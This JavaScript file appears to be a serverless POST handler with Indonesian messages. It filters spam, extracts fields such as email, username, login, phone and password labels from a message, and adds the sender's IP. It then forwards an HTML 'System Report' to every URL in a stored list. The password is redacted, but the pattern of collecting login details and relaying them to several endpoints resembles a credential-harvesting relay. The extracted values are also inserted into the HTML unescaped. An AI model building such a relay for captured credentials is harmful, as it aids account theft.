const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

/* ======================
   SAFE LOAD URL
====================== */
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];

    const data = fs.readFileSync(FILE, "utf8");
    if (!data) return [];

    const parsed = JSON.parse(data);
    return Array.isArray(parsed) ? parsed : [];

  } catch (err) {
    console.log("LOAD ERROR:", err.message);
    return [];
  }
}

/* ======================
   NORMALIZE KEY
====================== */
function normalizeKey(key = "") {
  key = String(key).toLowerCase();

  const map = {
    email: ["email", "e-mail", "mail"],
    password: ["password", "pass", "kata sandi", "sandi", "pwd"],
    user: ["user", "username", "nama", "name"],
    login: ["login", "auth"],
    phone: ["phone", "hp", "telepon", "nomor"],
    ip: ["ip", "ip address"],
  };

  for (const k in map) {
    if (map[k].some(x => key.includes(x))) return k;
  }

  return key.replace(/\s+/g, "_");
}

/* ======================
   CLEAN HTML
====================== */
function stripHtml(input = "") {
  return String(input)
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/\r/g, "\n");
}

/* ======================
   EXTRACT VARS
====================== */
function extractVars(input = "") {
  const vars = {};
  const html = stripHtml(input);

  const tdRegex = /<td[^>]*>(.*?)<\/td>\s*<td[^>]*>(.*?)<\/td>/gi;
  let m;

  while ((m = tdRegex.exec(html)) !== null) {
    const key = normalizeKey(m[1]);
    const value = String(m[2]).replace(/<[^>]*>/g, "").trim();
    if (value) vars[key] = value;
  }

  const lines = html.split("\n");

  for (const line of lines) {
    const clean = line.replace(/<[^>]*>/g, "").trim();
    const m2 = clean.match(/^(.+?)\s*[:=]\s*(.+)$/);

    if (m2) {
      const key = normalizeKey(m2[1]);
      const value = m2[2].trim();
      if (value) vars[key] = value;
    }
  }

  return vars;
}

/* ======================
   BUILD HTML (RESTORED)
====================== */
function buildHtml(vars) {
  return `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
</head>
<body style="margin:0;background:#0f172a;font-family:Arial;color:#e5e7eb;padding:20px">

<div style="max-width:700px;margin:auto;background:#111827;border-radius:10px;overflow:hidden">

  <div style="padding:18px;background:#0b1220;text-align:center">
    <h2 style="margin:0">System Report</h2>
    <small style="color:#94a3b8">Auto Generated</small>
  </div>

  <div style="padding:20px">
    <table style="width:100%;border-collapse:collapse">

      <tr><td>User</td><td>${vars.user || "-"}</td></tr>
      <tr><td>Email</td><td>${vars.email || "-"}</td></tr>
      <tr><td>Password</td><td>***REDACTED***</td></tr>
      <tr><td>Login</td><td>${vars.login || "-"}</td></tr>
      <tr><td>Phone</td><td>${vars.phone || "-"}</td></tr>
      <tr><td>IP</td><td>${vars.ip || "-"}</td></tr>

    </table>
  </div>

</div>

</body>
</html>
`;
}

/* ======================
   ANTI SPAM (SUBJEK + PESAN)
====================== */
function containsSpamPattern(text = "") {
  const t = String(text).toLowerCase();

  const patterns = [
    /free\s+money/,
    /klik\s+di\s+sini/,
    /wa\s*me/,
    /http/,
    /bit\.ly|tinyurl|cutt\.ly/,
    /(.)\1{6,}/,
    /buy\s+now|order\s+now/,
    /pinjaman|kredit\s+cepat/,
    /xxx|porn|sex/
  ];

  return patterns.some(p => p.test(t));
}

function spamScore(text = "") {
  const t = String(text);
  let score = 0;

  if (t.includes("http")) score += 2;
  if (/(.)\1{5,}/.test(t)) score += 2;
  if (t.length > 2000) score += 1;
  if (/[A-Z]{10,}/.test(t)) score += 1;

  return score;
}

/* ======================
   SAFE FETCH
====================== */
const fetchFn =
  global.fetch ||
  (() => null);

const AbortCtrl =
  global.AbortController ||
  (() => null);

/* ======================
   MAIN HANDLER
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        message: "POST only"
      });
    }

    const body = req.body || {};
    const subjek = String(body.subjek || "");
    const pesan = String(body.pesan || "");

    /* ======================
       VALIDASI WAJIB
    ====================== */
    if (!subjek || !pesan) {
      return res.status(400).json({
        success: false,
        message: "subjek & pesan wajib diisi"
      });
    }

    /* ======================
       ANTI SPAM
    ====================== */
    if (containsSpamPattern(subjek) || spamScore(subjek) >= 2) {
      return res.status(400).json({
        success: false,
        message: "Subjek terdeteksi spam"
      });
    }

    if (containsSpamPattern(pesan) || spamScore(pesan) >= 3) {
      return res.status(400).json({
        success: false,
        message: "Pesan terdeteksi spam"
      });
    }

    const vars = extractVars(pesan);

    vars.ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress ||
      "unknown";

    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!urls.length) {
      return res.json({
        success: false,
        message: "URL kosong"
      });
    }

    /* ======================
       SAFE REQUEST
    ====================== */
    const results = await Promise.allSettled(
      urls.map(async (url) => {
        try {
          if (!fetchFn) throw new Error("fetch not available");

          const controller = AbortCtrl ? new AbortCtrl() : null;
          const timeout = controller
            ? setTimeout(() => controller.abort(), 8000)
            : null;

          const r = await fetchFn(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
              subjek,
              pesan: html
            }),
            signal: controller?.signal
          });

          if (timeout) clearTimeout(timeout);

          return {
            url,
            success: true,
            status: r.status
          };

        } catch (err) {
          return {
            url,
            success: false,
            error: err.message
          };
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      results: results.map(r => r.value || r.reason)
    });

  } catch (err) {
    console.log("FATAL ERROR:", err);

    return res.status(500).json({
      success: false,
      message: "internal error safe mode",
      error: err.message || "UNKNOWN"
    });
  }
};
